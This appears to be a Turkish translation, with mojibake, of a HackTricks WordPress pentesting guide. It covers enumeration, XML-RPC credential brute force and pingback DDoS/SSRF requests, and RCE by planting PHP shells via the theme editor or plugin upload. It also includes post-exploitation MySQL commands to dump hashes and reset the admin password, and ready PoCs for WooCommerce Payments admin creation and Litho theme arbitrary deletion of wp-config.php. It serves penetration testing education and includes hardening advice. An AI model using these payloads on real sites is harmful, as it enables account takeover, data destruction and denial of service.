# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Temel Bilgiler

- **YÃ¼klenen** dosyalar ÅŸu adrese gider: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Tema dosyalarÄ± /wp-content/themes/ dizininde bulunur,** bu yÃ¼zden temanÄ±n bazÄ± php dosyalarÄ±nÄ± deÄŸiÅŸtirip RCE elde etmeye Ã§alÄ±ÅŸÄ±rsanÄ±z muhtemelen bu yolu kullanÄ±rsÄ±nÄ±z. Ã–rneÄŸin: **twentytwelve** temasÄ±nÄ± kullanarak [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php) dosyasÄ±na **eriÅŸebilirsiniz**.

- **BaÅŸka faydalÄ± bir url olabilir:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **wp-config.php** iÃ§inde veritabanÄ±nÄ±n root parolasÄ±nÄ± bulabilirsiniz.
- Kontrol edilecek varsayÄ±lan giriÅŸ yollarÄ±: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Ana WordPress DosyalarÄ±**

- `index.php`
- `license.txt` Ã¶rneÄŸin yÃ¼klÃ¼ WordPress sÃ¼rÃ¼mÃ¼nÃ¼ iÃ§eren faydalÄ± bilgiler barÄ±ndÄ±rÄ±r.
- `wp-activate.php` yeni bir WordPress sitesi kurulumunda e-posta aktivasyon sÃ¼reci iÃ§in kullanÄ±lÄ±r.
- GiriÅŸ klasÃ¶rleri (gizlemek iÃ§in yeniden adlandÄ±rÄ±lmÄ±ÅŸ olabilir):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` HTTP taÅŸÄ±ma mekanizmasÄ± ve XML kodlama mekanizmasÄ± ile veri iletimine izin veren bir WordPress Ã¶zelliÄŸini temsil eden bir dosyadÄ±r. Bu tÃ¼r iletiÅŸim WordPress [REST API](https://developer.wordpress.org/rest-api/reference) ile deÄŸiÅŸtirilmiÅŸtir.
- `wp-content` klasÃ¶rÃ¼ eklenti ve temalarÄ±n saklandÄ±ÄŸÄ± ana dizindir.
- `wp-content/uploads/` platforma yÃ¼klenen herhangi bir dosyanÄ±n saklandÄ±ÄŸÄ± dizindir.
- `wp-includes/` sertifikalar, fontlar, JavaScript dosyalarÄ± ve widget'lar gibi core dosyalarÄ±nÄ±n saklandÄ±ÄŸÄ± dizindir.
- `wp-sitemap.xml` Wordpress 5.5 ve Ã¼zeri sÃ¼rÃ¼mlerde, tÃ¼m herkese aÃ§Ä±k gÃ¶nderileri ve herkese aÃ§Ä±k sorgulanabilir post tÃ¼rleri ile taksonomileri iÃ§eren bir sitemap XML dosyasÄ± oluÅŸturur.

**Post exploitation**

- `wp-config.php` dosyasÄ± WordPress'in veritabanÄ±na baÄŸlanmasÄ± iÃ§in gereken veritabanÄ± adÄ±, veritabanÄ± hostu, kullanÄ±cÄ± adÄ± ve parola, kimlik doÄŸrulama anahtarlarÄ± ve tuzlar, ve veritabanÄ± tablo Ã¶neki gibi bilgileri iÃ§erir. Bu yapÄ±landÄ±rma dosyasÄ± ayrÄ±ca DEBUG modunu etkinleÅŸtirmek iÃ§in kullanÄ±labilir; bu da sorun giderme sÄ±rasÄ±nda faydalÄ± olabilir.

### KullanÄ±cÄ± Ä°zinleri

- **Administrator**
- **Editor**: Kendi ve diÄŸerlerinin gÃ¶nderilerini yayÄ±nlar ve yÃ¶netir
- **Author**: Kendi gÃ¶nderilerini yayÄ±nlar ve yÃ¶netir
- **Contributor**: GÃ¶nderilerini yazar ve yÃ¶netir ancak yayÄ±mlayamaz
- **Subscriber**: GÃ¶nderileri gÃ¶rÃ¼ntÃ¼ler ve profilini dÃ¼zenleyebilir

## **Pasif KeÅŸif**

### **WordPress sÃ¼rÃ¼mÃ¼nÃ¼ Ã¶ÄŸrenme**

`/license.txt` veya `/readme.html` dosyalarÄ±nÄ± bulup bulamayacaÄŸÄ±nÄ±zÄ± kontrol edin

SayfanÄ±n **kaynak kodu** iÃ§inde (Ã¶rnek from [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS link dosyalarÄ±

![](<../../images/image (533).png>)

- JavaScript dosyalarÄ±

![](<../../images/image (524).png>)

### Eklentiler
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### TemalarÄ± Al
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Genel olarak sÃ¼rÃ¼m bilgisi Ã§Ä±karma
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Aktif keÅŸif

### Eklentiler ve Temalar

Muhtemelen tÃ¼m eklentileri ve temalarÄ± bulamayacaksÄ±nÄ±z. Hepsini keÅŸfetmek iÃ§in, **aktif olarak eklenti ve tema listelerini Brute Force etmeniz** gerekecek (umarÄ±z bu listeleri iÃ§eren otomatik araÃ§lar vardÄ±r).

### KullanÄ±cÄ±lar

- **ID Brute:** Bir WordPress sitesinden geÃ§erli kullanÄ±cÄ±larÄ±, kullanÄ±cÄ± ID'lerini Brute Forcing yaparak elde edersiniz:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
EÄŸer yanÄ±tlar **200** veya **30X** ise, bu id'nin **geÃ§erli** olduÄŸu anlamÄ±na gelir. EÄŸer yanÄ±t **400** ise, id **geÃ§ersiz**dir.

- **wp-json:** KullanÄ±cÄ±lar hakkÄ±nda bilgi almak iÃ§in ÅŸu sorguyu da deneyebilirsiniz:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
KullanÄ±cÄ±lar hakkÄ±nda bazÄ± bilgiler aÃ§Ä±ÄŸa Ã§Ä±karabilecek bir diÄŸer `/wp-json/` endpoint ÅŸudur:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Note that this endpoint only exposes users that have made a post. **Sadece bu Ã¶zellik etkin olan kullanÄ±cÄ±larla ilgili bilgiler saÄŸlanacaktÄ±r**.

Also note that **/wp-json/wp/v2/pages** could leak IP addresses.

- **Login username enumeration**: **`/wp-login.php`** Ã¼zerinden giriÅŸ yaparken gÃ¶sterilen **mesaj**, kullanÄ±cÄ±nÄ±n var olup olmadÄ±ÄŸÄ±na gÃ¶re **farklÄ±dÄ±r**.

### XML-RPC

EÄŸer `xml-rpc.php` aktifse credentials brute-force gerÃ§ekleÅŸtirebilir veya bunu diÄŸer kaynaklara DoS saldÄ±rÄ±larÄ± baÅŸlatmak iÃ§in kullanabilirsiniz. (Bu iÅŸlemi Ã¶rneÄŸin [using this](https://github.com/relarizky/wpxploit) ile otomatikleÅŸtirebilirsiniz).

To see if it is active try to access to _**/xmlrpc.php**_ and send this request:

**Kontrol**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** veya **`metaWeblog.getUsersBlogs`** brute-force credentials iÃ§in kullanÄ±labilecek yÃ¶ntemlerden bazÄ±larÄ±dÄ±r. EÄŸer bunlardan herhangi birini bulabilirseniz ÅŸu ÅŸekilde bir ÅŸey gÃ¶nderebilirsiniz:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
GeÃ§erli olmayan kimlik bilgileri varsa, 200 kodlu yanÄ±t iÃ§inde _"Incorrect username or password"_ mesajÄ± gÃ¶rÃ¼nmelidir.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

DoÄŸru kimlik bilgileriyle bir dosya yÃ¼kleyebilirsiniz. YanÄ±tta yol gÃ¶rÃ¼necektir ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Also there is a **daha hÄ±zlÄ± bir yol** to brute-force credentials using **`system.multicall`** as you can try several credentials on the same request:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

Bu yÃ¶ntem programlar iÃ§in tasarlanmÄ±ÅŸtÄ±r, insanlar iÃ§in deÄŸil ve eski olduÄŸu iÃ§in 2FA'yÄ± desteklemiyor. Yani, geÃ§erli creds'iniz varsa ancak ana giriÅŸ 2FA ile korunuyorsa, **xmlrpc.php'yi kullanarak bu creds ile 2FA'yÄ± atlayarak oturum aÃ§mayÄ± kÃ¶tÃ¼ye kullanabilirsiniz**. Konsol aracÄ±lÄ±ÄŸÄ±yla yapabildiÄŸiniz tÃ¼m iÅŸlemleri gerÃ§ekleÅŸtiremeyebilirsiniz, ancak Ippsec'in aÃ§Ä±kladÄ±ÄŸÄ± gibi yine de RCE'ye ulaÅŸabilirsiniz: [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS or port scanning**

If you can find the method _**pingback.ping**_ inside the list you can make the Wordpress send an arbitrary request to any host/port.\
Bu, **binlerce** Wordpress **site**'nin tek bir **konum**'a **eriÅŸim**de bulunmasÄ±nÄ± saÄŸlamak iÃ§in kullanÄ±labilir (bÃ¶ylece o konumda bir **DDoS** oluÅŸur) veya herhangi bir port belirterek **Wordpress**'in bazÄ± iÃ§ **aÄŸ**'larÄ± **taramasÄ±nÄ±** saÄŸlamak iÃ§in kullanÄ±labilir.
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

EÄŸer **faultCode** deÄŸeri **0**'dan bÃ¼yÃ¼k (17) ise, bu portun aÃ§Ä±k olduÄŸu anlamÄ±na gelir.

Ã–nceki bÃ¶lÃ¼mdeki **`system.multicall`** kullanÄ±mÄ±na bakarak bu yÃ¶ntemi DDoS oluÅŸturmak iÃ§in nasÄ±l suistimal edebileceÄŸinizi Ã¶ÄŸrenin.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Bu dosya genellikle Wordpress sitesinin kÃ¶kÃ¼nde bulunur: **`/wp-cron.php`**\
Bu dosyaya **eriÅŸildiÄŸinde** "**aÄŸÄ±r**" MySQL **sorgu** Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r; bu yÃ¼zden **attackers** bir **DoS**'a **sebep olabilir**.\
AyrÄ±ca, varsayÄ±lan olarak, `wp-cron.php` her sayfa yÃ¼kleniÅŸinde (bir istemci herhangi bir Wordpress sayfasÄ±nÄ± istediÄŸinde) tetiklenir; yÃ¼ksek trafikli sitelerde bu problemler (DoS) yaratabilir.

Wp-Cron'u devre dÄ±ÅŸÄ± bÄ±rakÄ±p, sunucu iÃ§inde gerekli iÅŸlemleri dÃ¼zenli aralÄ±klarla gerÃ§ekleÅŸtirecek gerÃ§ek bir cronjob oluÅŸturmanÄ±z Ã¶nerilir (sorunlara yol aÃ§madan).

### /wp-json/oembed/1.0/proxy - SSRF

Åu adrese eriÅŸmeyi deneyin _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ ve Worpress sitesi size bir istek yapabilir.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Bu araÃ§, **methodName: pingback.ping**'in ve **/wp-json/oembed/1.0/proxy** yolunun varlÄ±ÄŸÄ±nÄ± kontrol eder; eÄŸer mevcutsa, bunlarÄ± exploit etmeye Ã§alÄ±ÅŸÄ±r.

## Otomatik AraÃ§lar
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Bir biti Ã¼zerine yazarak eriÅŸim saÄŸlama

GerÃ§ek bir saldÄ±rÄ±dan Ã§ok bir merak konusudur. CTF'de [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) herhangi bir wordpress dosyasÄ±ndaki 1 biti deÄŸiÅŸtirebiliyordunuz. BÃ¶ylece `/var/www/html/wp-includes/user.php` dosyasÄ±nÄ±n `5389` konumundaki biti deÄŸiÅŸtirerek NOT (`!`) iÅŸlemini NOP yapabilirdiniz.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**KullanÄ±lan temadaki bir php'yi deÄŸiÅŸtirme (admin credentials needed)**

Appearance â†’ Theme Editor â†’ 404 Template (saÄŸ tarafta)

Ä°Ã§eriÄŸi bir php shell ile deÄŸiÅŸtirin:

![](<../../images/image (384).png>)

GÃ¼ncellenmiÅŸ sayfaya nasÄ±l eriÅŸileceÄŸini internette araÅŸtÄ±rÄ±n. Bu durumda ÅŸuraya eriÅŸmeniz gerekiyor: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Åunu kullanabilirsiniz:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
oturum elde etmek iÃ§in.

## Plugin RCE

### PHP plugin

.php dosyalarÄ±nÄ± bir plugin olarak yÃ¼klemek mÃ¼mkÃ¼n olabilir.\
Ã–rneÄŸin ÅŸu ÅŸekilde php backdoor'unuzu oluÅŸturun:

![](<../../images/image (183).png>)

Sonra yeni bir plugin ekleyin:

![](<../../images/image (722).png>)

Plugin'i yÃ¼kleyin ve "Install Now" butonuna basÄ±n:

![](<../../images/image (249).png>)

"Procced"e tÄ±klayÄ±n:

![](<../../images/image (70).png>)

Muhtemelen gÃ¶rÃ¼nÃ¼rde hiÃ§bir ÅŸey olmayacak, ancak Media'ya giderseniz yÃ¼klenmiÅŸ shell'inizi gÃ¶receksiniz:

![](<../../images/image (462).png>)

EriÅŸin ve reverse shell'i Ã§alÄ±ÅŸtÄ±rmak iÃ§in URL'yi gÃ¶receksiniz:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

Bu yÃ¶ntem, bilinen ÅŸekilde zafiyetli olan ve web shell elde etmek iÃ§in istismar edilebilen zararlÄ± bir plugin'in kurulmasÄ±nÄ± iÃ§erir. Bu iÅŸlem WordPress dashboard Ã¼zerinden ÅŸu ÅŸekilde gerÃ§ekleÅŸtirilir:

1. **Plugin Edinimi**: Plugin, Exploit DB gibi bir kaynaktan elde edilir; Ã¶rneÄŸin [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Kurulumu**:
- WordPress dashboard'a gidin, sonra `Dashboard > Plugins > Upload Plugin`.
- Ä°ndirilen plugin'in zip dosyasÄ±nÄ± yÃ¼kleyin.
3. **Plugin Aktivasyonu**: Plugin baÅŸarÄ±lÄ± ÅŸekilde yÃ¼klendikten sonra dashboard Ã¼zerinden aktive edilmelidir.
4. **Exploitation**:
- "reflex-gallery" plugin'i yÃ¼klÃ¼ ve aktif olduÄŸunda, zafiyeti bilindiÄŸi iÃ§in istismar edilebilir.
- Metasploit framework bu zafiyet iÃ§in bir exploit saÄŸlar. Uygun modÃ¼lÃ¼ yÃ¼kleyip belirli komutlarÄ± Ã§alÄ±ÅŸtÄ±rarak bir meterpreter oturumu kurulabilir ve siteye yetkisiz eriÅŸim saÄŸlanabilir.
- Bunun, bir WordPress sitesini istismar etmenin birÃ§ok yÃ¶nteminden sadece biri olduÄŸu not edilmelidir.

Ä°Ã§erik, WordPress dashboard'unda plugin'i yÃ¼kleme ve aktifleÅŸtirme adÄ±mlarÄ±nÄ± gÃ¶steren gÃ¶rsel yardÄ±mcÄ±lar iÃ§erir. Ancak, bu ÅŸekilde zafiyetleri istismar etmek uygun yetki olmadan yasa dÄ±ÅŸÄ± ve etik dÄ±ÅŸÄ±dÄ±r. Bu bilgiler sorumlu ÅŸekilde ve yalnÄ±zca aÃ§Ä±k izinle yapÄ±lan penetration testing gibi yasal baÄŸlamlarda kullanÄ±lmalÄ±dÄ±r.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## XSS'ten RCE'ye

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ WordPress'te bir **Cross-Site Scripting (XSS)** zafiyetini **Remote Code Execution (RCE)** veya diÄŸer kritik zafiyetlere yÃ¼kseltmek iÃ§in tasarlanmÄ±ÅŸ bir script'tir. Daha fazla bilgi iÃ§in [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html)'a bakÄ±n. AÅŸaÄŸÄ±daki Wordpress sÃ¼rÃ¼mlerini destekler ve ÅŸunlarÄ± yapmaya olanak tanÄ±r:
- _**Privilege Escalation:**_ WordPress'te bir kullanÄ±cÄ± oluÅŸturur.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Ã–zel plugin (backdoor) yÃ¼klemenizi saÄŸlar.
- _**(RCE) Built-In Plugin Edit:**_ WordPress'teki built-in plugin'leri dÃ¼zenlemenizi saÄŸlar.
- _**(RCE) Built-In Theme Edit:**_ WordPress'teki built-in theme'leri dÃ¼zenlemenizi saÄŸlar.
- _**(Custom) Custom Exploits:**_ ÃœÃ§Ã¼ncÃ¼ taraf WordPress pluginleri/temalarÄ± iÃ§in Ã¶zel exploit'ler.

## Post Exploitation

KullanÄ±cÄ± adlarÄ± ve parolalarÄ± Ã§Ä±kar:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
admin parolasÄ±nÄ± deÄŸiÅŸtir:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Attack Surface

Bir Wordpress eklentisinin iÅŸlevselliÄŸi nasÄ±l aÃ§Ä±ÄŸa Ã§Ä±kardÄ±ÄŸÄ±nÄ± bilmek, o iÅŸlevlerdeki zafiyetleri bulmak iÃ§in anahtardÄ±r. Bir eklentinin iÅŸlevselliÄŸi nasÄ±l aÃ§Ä±ÄŸa Ã§Ä±karabileceÄŸini aÅŸaÄŸÄ±daki madde baÅŸlÄ±klarÄ±nda bulabilirsiniz ve savunmasÄ±z bazÄ± eklenti Ã¶rnekleri iÃ§in [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Bir eklentinin fonksiyonlarÄ±nÄ± kullanÄ±cÄ±lara aÃ§Ä±ÄŸa Ã§Ä±karmasÄ±nÄ±n yollarÄ±ndan biri AJAX iÅŸleyicileridir. Bunlar mantÄ±k, authorization veya authentication hatalarÄ± iÃ§erebilir. AyrÄ±ca, bu fonksiyonlarÄ±n sÄ±klÄ±kla hem authentication hem authorization'Ä± bir wordpress nonce'unun varlÄ±ÄŸÄ±na dayandÄ±rmasÄ± yaygÄ±ndÄ±r; bu nonce **Wordpress kurulumunda kimliÄŸi doÄŸrulanmÄ±ÅŸ herhangi bir kullanÄ±cÄ±da bulunabilir** (rolÃ¼nden baÄŸÄ±msÄ±z olarak).

Bunlar bir eklentide bir fonksiyonu aÃ§Ä±ÄŸa Ã§Ä±karmak iÃ§in kullanÄ±labilecek fonksiyonlardÄ±r:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**`nopriv` kullanÄ±mÄ± endpoint'i herhangi bir kullanÄ±cÄ± tarafÄ±ndan (kimlik doÄŸrulanmamÄ±ÅŸ olanlar dahil) eriÅŸilebilir hale getirir.**

> [!CAUTION]
> AyrÄ±ca, eÄŸer fonksiyon yalnÄ±zca kullanÄ±cÄ±nÄ±n yetkisini `wp_verify_nonce` fonksiyonuyla kontrol ediyorsa, bu fonksiyon sadece kullanÄ±cÄ±nÄ±n oturum aÃ§mÄ±ÅŸ olduÄŸunu doÄŸrular; genellikle kullanÄ±cÄ±nÄ±n rolÃ¼nÃ¼ kontrol etmez. Bu yÃ¼zden dÃ¼ÅŸÃ¼k ayrÄ±calÄ±ÄŸa sahip kullanÄ±cÄ±lar yÃ¼ksek ayrÄ±calÄ±klÄ± iÅŸlemlere eriÅŸebilir.

- **REST API**

AyrÄ±ca `register_rest_route` fonksiyonunu kullanarak wordpress'ten fonksiyonlarÄ± bir REST API olarak kayÄ±t edip aÃ§Ä±ÄŸa Ã§Ä±karmak da mÃ¼mkÃ¼ndÃ¼r:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` is a callback to function that checks if a given user is authorized to call the API method.

**If the built-in `__return_true` function is used, it'll simply skip user permissions check.**

- **DoÄŸrudan php dosyasÄ±na eriÅŸim**

Elbette, Wordpress PHP kullanÄ±r ve eklenti iÃ§indeki dosyalar web Ã¼zerinden doÄŸrudan eriÅŸilebilir. Bu nedenle, bir eklenti yalnÄ±zca dosyaya eriÅŸilmesiyle tetiklenen herhangi bir gÃ¼venlik aÃ§Ä±ÄŸÄ± barÄ±ndÄ±rÄ±yorsa, bu herhangi bir kullanÄ±cÄ± tarafÄ±ndan istismar edilebilir.

### Trusted-header REST impersonation (WooCommerce Payments â‰¤ 5.6.1)

BazÄ± eklentiler dahili entegrasyonlar veya reverse proxy'ler iÃ§in â€œtrusted headerâ€ kÄ±sayollarÄ± uygular ve sonra bu header'Ä± REST istekleri iÃ§in mevcut kullanÄ±cÄ± baÄŸlamÄ±nÄ± ayarlamakta kullanÄ±r. EÄŸer bu header yukarÄ± akÄ±ÅŸ bileÅŸeni tarafÄ±ndan isteÄŸe kriptografik olarak baÄŸlanmamÄ±ÅŸsa, bir saldÄ±rgan onu taklit ederek yÃ¶netici olarak ayrÄ±calÄ±klÄ± REST rotalarÄ±na eriÅŸebilir.

- Impact: unauthenticated privilege escalation to admin by creating a new administrator via the core users REST route.
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (forces user ID 1, typically the first administrator account).
- Exploited route: `POST /wp-json/wp/v2/users` with an elevated role array.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Neden iÅŸe yarÄ±yor

- Plugin, istemci tarafÄ±ndan kontrol edilen bir header'Ä± authentication state ile eÅŸler ve capability kontrollerini atlar.
- WordPress core bu route iÃ§in `create_users` capability'sini bekler; plugin hack'i bu kontrolÃ¼ header'dan doÄŸrudan current user context ayarlayarak atlatÄ±r.

Beklenen baÅŸarÄ± gÃ¶stergeleri

- HTTP 201 ve oluÅŸturulan kullanÄ±cÄ±yÄ± tanÄ±mlayan bir JSON body.
- `wp-admin/users.php` iÃ§inde gÃ¶rÃ¼nen yeni bir admin kullanÄ±cÄ±.

Tespit kontrol listesi

- `getallheaders()`, `$_SERVER['HTTP_...']` iÃ§in grep yapÄ±n veya vendor SDK'larÄ± gibi custom header'larÄ± okuyup user context ayarlayan kÃ¼tÃ¼phanelere bakÄ±n (Ã¶r. `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Privileged callback'leri olan REST kayÄ±tlarÄ±nÄ± inceleyin; saÄŸlam bir `permission_callback` kontrolÃ¼ olmayan ve bunun yerine request header'larÄ±na gÃ¼venenleri tespit edin.
- REST handler'larÄ± iÃ§inde yalnÄ±zca header deÄŸerleri ile sÄ±nÄ±rlanan core user-management fonksiyonlarÄ±nÄ±n (`wp_insert_user`, `wp_create_user`) kullanÄ±mlarÄ±na bakÄ±n.

SertleÅŸtirme

- Authentication veya authorization'Ä± istemci kontrollÃ¼ header'lardan tÃ¼retmeyin.
- Bir reverse proxy kimlik enjekte etmek zorundaysa, gÃ¼veni proxy'de sonlandÄ±rÄ±n ve gelen kopyalarÄ± kenarda strip edin (Ã¶r. edge'de `unset X-Wcpay-Platform-Checkout-User`), sonra imzalÄ± bir token ile iletin ve server-side doÄŸrulayÄ±n.
- Privileged action yapan REST route'larÄ± iÃ§in `current_user_can()` kontrolleri ve katÄ± bir `permission_callback` zorunlu kÄ±lÄ±n ( `__return_true` kullanmayÄ±n).
- Header â€œimpersonationâ€ yerine birinci taraf auth'u (cookies, application passwords, OAuth) tercih edin.

Referanslar: halka aÃ§Ä±k bir vaka ve daha geniÅŸ analiz iÃ§in sayfanÄ±n sonundaki linklere bakÄ±n.

### wp_ajax_nopriv ile Yetkisiz Keyfi Dosya Silme (Litho Theme <= 3.0)

WordPress temalarÄ± ve eklentileri sÄ±kÃ§a AJAX handler'larÄ±nÄ± `wp_ajax_` ve `wp_ajax_nopriv_` hook'larÄ± aracÄ±lÄ±ÄŸÄ±yla aÃ§Ä±ÄŸa Ã§Ä±karÄ±r. **_nopriv_** varyantÄ± kullanÄ±ldÄ±ÄŸÄ±nda **callback yetkisiz ziyaretÃ§iler tarafÄ±ndan eriÅŸilebilir hale gelir**, bu yÃ¼zden herhangi bir hassas iÅŸlem ayrÄ±ca aÅŸaÄŸÄ±dakileri uygulamalÄ±dÄ±r:

1. Bir **yetki kontrolÃ¼** (Ã¶r. `current_user_can()` veya en azÄ±ndan `is_user_logged_in()`), ve
2. `check_ajax_referer()` / `wp_verify_nonce()` ile doÄŸrulanan bir **CSRF nonce**, ve
3. **SÄ±kÄ± girdi sanitizasyonu / doÄŸrulamasÄ±**.

Litho multipurpose theme (< 3.1) bu 3 kontrolÃ¼ *Remove Font Family* Ã¶zelliÄŸinde unutmuÅŸ ve sonuÃ§ olarak aÅŸaÄŸÄ±daki kodu (sadeleÅŸtirilmiÅŸ) daÄŸÄ±tmÄ±ÅŸ:
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Bu kod parÃ§asÄ±nÄ±n yol aÃ§tÄ±ÄŸÄ± sorunlar:

* **Kimlik doÄŸrulamasÄ± olmayan eriÅŸim** â€“ `wp_ajax_nopriv_` hook'Ä± kayÄ±tlÄ±.
* **Nonce / capability check yok** â€“ herhangi bir ziyaretÃ§i endpoint'e istek gÃ¶nderebilir.
* **Yol sanitizasyonu yok** â€“ kullanÄ±cÄ± kontrollÃ¼ `fontfamily` string'i filtrelenmeden dosya sistemi yoluna ekleniyor, klasik `../../` traversal'a izin veriyor.

#### Ä°stismar

Bir saldÄ±rgan tek bir HTTP POST isteÄŸi gÃ¶ndererek herhangi bir dosyayÄ± veya dizini **uploads ana dizininin altÄ±nda** (genellikle `<wp-root>/wp-content/uploads/`) silebilir:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
